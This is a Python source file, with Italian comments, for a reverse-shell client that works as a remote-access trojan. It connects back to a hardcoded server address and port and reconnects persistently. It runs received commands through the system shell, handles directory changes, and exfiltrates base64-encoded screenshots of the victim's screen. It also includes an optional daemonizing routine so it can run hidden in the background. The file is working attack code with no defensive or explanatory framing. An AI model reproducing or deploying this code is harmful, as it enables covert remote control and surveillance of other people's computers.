#!/usr/bin/env python3
import socket
import subprocess
import time
import os
import sys
import base64
import io

try:
    import mss
    from PIL import Image
    MSS_AVAILABLE = True
except Exception:
    MSS_AVAILABLE = False

SERVER_IP = '192.168.1.6'  # Cambia con l'IP del server
SERVER_PORT = 5666


def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed: {e}")
        sys.exit(1)

    os.setsid()

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Second fork failed: {e}")
        sys.exit(1)


def capture_screenshot_bytes():
    if not MSS_AVAILABLE:
        return None
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            img = sct.grab(monitor)
            im = Image.frombytes('RGB', img.size, img.rgb)
            buffer = io.BytesIO()
            im.save(buffer, format='PNG')
            buffer.seek(0)
            return buffer.read()
    except Exception:
        return None


def send_screenshot_protocol(sock):
    img_bytes = capture_screenshot_bytes()
    if img_bytes is None:
        err = "Error: unable to capture screenshot or mss not available"
        try:
            sock.send(err.encode('utf-8'))
        except Exception:
            pass
        return

    encoded = base64.b64encode(img_bytes)
    length = len(encoded)
    header = f"SCREENSHOT|{length}\n".encode('utf-8')
    try:
        sock.sendall(header)
        CHUNK = 4096
        sent = 0
        while sent < length:
            chunk = encoded[sent:sent+CHUNK]
            sock.sendall(chunk)
            sent += len(chunk)
    except Exception as e:
        try:
            sock.send(f"Error: {e}".encode('utf-8'))
        except Exception:
            pass


def execute_shell_command(command, cwd):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=cwd)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"


def connect_to_server():
    current_dir = os.getcwd()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            while True:
                command = s.recv(4096).decode('utf-8', errors='ignore')
                if not command:
                    break

                cmd_stripped = command.strip()
                if cmd_stripped.lower() == "screenshot":
                    send_screenshot_protocol(s)
                    continue

                if cmd_stripped.startswith("cd "):
                    path = cmd_stripped[3:].strip()
                    try:
                        os.chdir(path)
                        current_dir = os.getcwd()
                        output = ""
                    except Exception as e:
                        output = f"Error: {e}"
                else:
                    output = execute_shell_command(command, current_dir)

                try:
                    if isinstance(output, str):
                        s.sendall(output.encode('utf-8'))
                    else:
                        s.sendall(str(output).encode('utf-8'))
                except Exception:
                    break

        except Exception:
            time.sleep(5)
        finally:
            try:
                s.close()
            except Exception:
                pass


if __name__ == "__main__":
    # Se vuoi far girare il client in background su Linux, decommenta:
    # daemonize()
    connect_to_server()
